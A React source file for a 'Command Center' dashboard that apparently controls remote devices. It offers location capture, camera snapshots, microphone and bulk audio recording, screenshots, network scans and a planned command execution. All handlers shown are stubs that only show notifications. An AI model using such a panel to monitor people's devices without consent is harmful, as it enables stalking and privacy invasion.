import { useEffect, useState } from 'react';
import { useLayoutStore } from '../../stores/layoutStore';
import { useDevices } from '../../hooks/useDevices';
import { useCommands } from '../../hooks/useCommand';
import { useWebSocket } from '../../hooks/useWebSocket';
import { useNotification } from '../../hooks/useNotification';
import { Breadcrumbs } from '../../components/layout';
import { FadeIn, FadeInItem } from '../../components/animations';
import {
  MetricsGrid,
  DeviceGrid,
  ActivityFeed,
  SystemHealth,
  QuickActions,
} from '../../components/dashboard';
import type { Device } from '../../types/api';
import { DeviceStatus } from '../../types/api';
import { Zap } from 'lucide-react';

export function Dashboard() {
  const setBreadcrumbs = useLayoutStore((state) => state.setBreadcrumbs);
  const { devices, loading: devicesLoading } = useDevices();
  const { commands, loading: commandsLoading } = useCommands();
  const { isConnected } = useWebSocket();
  const { notify } = useNotification();
  const [activeSessions, setActiveSessions] = useState(0);

  useEffect(() => {
    setBreadcrumbs([{ label: 'Dashboard' }]);
  }, [setBreadcrumbs]);

  // Calculate metrics
  const onlineDevices = devices.filter((d) => d.status === DeviceStatus.ONLINE);
  const totalDevices = devices.length;
  
  // Commands in last 24 hours
  const yesterday = new Date();
  yesterday.setDate(yesterday.getDate() - 1);
  const recentCommands = commands.filter(
    (cmd) => new Date(cmd.createdAt) > yesterday
  );

  // Calculate data collected (mock for now)
  const dataCollected = `${(totalDevices * 2.5).toFixed(1)} MB`;

  // Alerts (mock)
  const alerts = onlineDevices.filter((d) => (d.batteryLevel || 100) < 20).length;

  // Update active sessions based on WebSocket status
  useEffect(() => {
    if (isConnected) {
      setActiveSessions(onlineDevices.length);
    } else {
      setActiveSessions(0);
    }
  }, [isConnected, onlineDevices.length]);

  // Handle device click
  const handleDeviceClick = (device: Device) => {
    notify.info(`Viewing device: ${device.name}`);
  };

  // Handle quick actions on device
  const handleQuickAction = async (
    device: Device,
    action: 'location' | 'camera' | 'mic'
  ) => {
    const actionNames = {
      location: 'Location Capture',
      camera: 'Camera Snapshot',
      mic: 'Microphone Recording',
    };

    notify.info(`${actionNames[action]} initiated for ${device.name}`);
    console.log(`Quick action: ${action} on device ${device.id}`);
  };

  // Quick actions handlers
  const handleBroadcastMessage = () => {
    notify.info('Broadcast message feature coming soon');
  };

  const handleCaptureLocations = () => {
    if (onlineDevices.length === 0) {
      notify.warning('No online devices to capture locations from');
      return;
    }
    notify.info(`Capturing locations from ${onlineDevices.length} devices`);
  };

  const handleGenerateReport = () => {
    notify.info('Generating report...');
  };

  const handleViewAnalytics = () => {
    notify.info('Opening analytics dashboard...');
  };

  const handleBulkScreenshot = () => {
    if (onlineDevices.length === 0) {
      notify.warning('No online devices available');
      return;
    }
    notify.info(`Taking screenshots from ${onlineDevices.length} devices`);
  };

  const handleBulkAudio = () => {
    if (onlineDevices.length === 0) {
      notify.warning('No online devices available');
      return;
    }
    notify.info(`Recording audio from ${onlineDevices.length} devices`);
  };

  const handleExecuteCommand = () => {
    if (onlineDevices.length === 0) {
      notify.warning('No online devices available');
      return;
    }
    notify.info('Execute command feature coming soon');
  };

  const handleNetworkScan = () => {
    if (onlineDevices.length === 0) {
      notify.warning('No online devices available');
      return;
    }
    notify.info(`Scanning networks on ${onlineDevices.length} devices`);
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <FadeIn>
        <div>
          <Breadcrumbs items={[{ label: 'Dashboard' }]} />
          <div className="mt-4 flex items-center gap-3">
            <div className="p-3 bg-electric-500/10 rounded-xl glow-electric">
              <Zap size={32} className="text-electric-400" />
            </div>
            <div>
              <h1 className="text-3xl font-bold text-white">Command Center</h1>
              <p className="text-white/60 mt-1">
                Monitor and control your connected devices in real-time
              </p>
            </div>
          </div>
        </div>
      </FadeIn>

      {/* Metrics Grid */}
      <FadeIn delay={0.1} stagger staggerDelay="fast">
        <FadeInItem>
          <MetricsGrid
            devicesOnline={onlineDevices.length}
            totalDevices={totalDevices}
            commandsRun={recentCommands.length}
            activeSessions={activeSessions}
            dataCollected={dataCollected}
            alerts={alerts}
            loading={devicesLoading}
          />
        </FadeInItem>
      </FadeIn>

      {/* Quick Actions */}
      <FadeIn delay={0.2}>
        <QuickActions
          onBroadcastMessage={handleBroadcastMessage}
          onCaptureLocations={handleCaptureLocations}
          onGenerateReport={handleGenerateReport}
          onViewAnalytics={handleViewAnalytics}
          onBulkScreenshot={handleBulkScreenshot}
          onBulkAudio={handleBulkAudio}
          onExecuteCommand={handleExecuteCommand}
          onNetworkScan={handleNetworkScan}
          disabled={!isConnected}
        />
      </FadeIn>

      {/* Main Content Grid */}
      <FadeIn delay={0.3}>
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Device Grid - Takes 2 columns */}
          <div className="lg:col-span-2">
            <DeviceGrid
              devices={devices}
              onDeviceClick={handleDeviceClick}
              onQuickAction={handleQuickAction}
              loading={devicesLoading}
            />
          </div>

          {/* Right Sidebar */}
          <div className="space-y-6">
            {/* System Health */}
            <SystemHealth
              serverStatus="healthy"
              databaseStatus="healthy"
              redisStatus="healthy"
              loading={false}
            />

            {/* Activity Feed */}
            <ActivityFeed
              commands={commands.slice(0, 10)}
              maxItems={10}
              loading={commandsLoading}
            />
          </div>
        </div>
      </FadeIn>
    </div>
  );
}
